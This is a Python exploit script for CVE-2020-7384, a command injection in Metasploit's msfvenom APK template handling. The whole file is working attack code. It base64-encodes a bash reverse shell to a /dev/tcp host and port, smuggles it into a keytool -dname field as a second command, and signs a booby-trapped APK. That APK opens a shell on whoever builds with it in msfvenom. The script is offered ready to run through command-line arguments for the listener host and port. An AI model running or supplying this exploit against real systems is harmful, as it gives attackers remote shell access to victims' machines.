import argparse
import subprocess
import base64
import random
import sys
from log_colors import *
import string
import os, tempfile

# CVE-2020-7384
# Metasploit Framework - msfvenom apk template command injection
# Metasploit Framework 6.0.11
class CVE2020_7384:
    
    def __init__(self, apk_name, ip, port):
        print (LogColors.BLUE + "apk: " + apk_name + "..." + LogColors.ENDC)
        print (LogColors.YELLOW + "generate storepass, keypass..." + LogColors.ENDC)
        self.ip, self.port = ip, port
        tmp = tempfile.mkdtemp()
        if ".apk" == apk_name[-4:]:
            self.apk = os.path.join(tmp, apk_name)
        else:
            sys.exit()
        emp = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
        keystore_file = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
        self.emp = os.path.join(tmp, emp)
        self.keystore_file = os.path.join(tmp, keystore_file + ".keystore")
        self.storepass = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
        self.keypass = self.storepass
        self.key_alias = 'signing.key'
   
    # generate payload with reverse shell (bash)
    def generate_payload(self):
        print (LogColors.BLUE + "generate payload..." + LogColors.ENDC)
        self.revshell = "/bin/bash -c \"/bin/bash -i >& /dev/tcp/{}/{} 0>&1\"".format(self.ip, self.port)
        cmd_base64 = base64.b64encode(self.revshell.encode()).decode()
        self.dname = f"CN='|echo {cmd_base64} | base64 -d | sh #"
        print (LogColors.YELLOW + self.revshell + LogColors.ENDC)

    # prepare apk file
    def apk_prepare(self):
        print (LogColors.BLUE + "prepare apk..." + LogColors.ENDC)
        with open(self.emp, "w") as f:
            f.close()
        cmd = "zip -j {} {}".format(self.apk, self.emp)
        print (LogColors.YELLOW + "run: " + cmd + "..." + LogColors.ENDC)
        cmd = cmd.split()
        subprocess.check_call(cmd)

    # generate signing key with dname
    def generate_signing_key(self):
        print (LogColors.BLUE + "generate signing key..." + LogColors.ENDC)
        cmd = "keytool -genkey "
        cmd += "-keystore {} ".format(self.keystore_file)
        cmd += "-alias {} ".format(self.key_alias)
        cmd += "-storepass {} ".format(self.storepass)
        cmd += "-keypass {} ".format(self.keypass)
        cmd += "-keyalg RSA "
        cmd += "-keysize 2048 "
        print (LogColors.YELLOW + "run: " + cmd + "-dname " + self.dname + "..." + LogColors.ENDC)
        cmd = cmd.split()
        cmd.append("-dname")
        cmd.append(self.dname)
        subprocess.check_call(cmd, universal_newlines = True)

    # sign apk using malicious dname
    def apk_sign(self):
        print (LogColors.BLUE + "sign apk..." + LogColors.ENDC)
        cmd = "jarsigner -sigalg SHA1withRSA -digestalg SHA1 "
        cmd += "-keystore {} ".format(self.keystore_file)
        cmd += "-storepass {} ".format(self.storepass)
        cmd += "-keypass {} ".format(self.keypass)
        cmd += "{} {}".format(self.apk, self.key_alias)
        print (LogColors.YELLOW + "run: " + cmd + "..." + LogColors.ENDC)
        cmd = cmd.split()
        subprocess.check_call(cmd)
    
    # create apk file with reverse shell
    def create_apk(self):
        print (LogColors.YELLOW + "create hacked apk: " + self.revshell + LogColors.ENDC)
        try:
            cmd = "msfvenom "
            cmd += "-x {} ".format(self.apk)
            cmd += "-p android/meterpreter/reverse_tcp "
            cmd += "LHOST={} ".format(self.ip)
            cmd += "LPORT={} ".format(self.port)
            cmd += "-o /dev/null"
            subprocess.run(cmd, shell = True)
            print (LogColors.GREEN + "reverse shell payload successfully generated :)" + LogColors.ENDC)
            print (LogColors.GREEN + "malicious apk: " + self.apk + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "generate rev shell payload failed :(" + LogColors.ENDC)
            sys.exit()
    
    # exploitation logic
    def exploit(self):
        self.generate_payload()
        self.apk_prepare()
        self.generate_signing_key()
        self.apk_sign()
        self.create_apk()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-a','--apk', required = True, help = "apk filename")
    parser.add_argument('-l','--lhost', required = True, help = "rev shell host")
    parser.add_argument('-p','--lport', required = True, help = "rev shell port")
    args = vars(parser.parse_args())
    cve = CVE2020_7384(args['apk'], args['lhost'], args['lport'])
    cve.exploit()

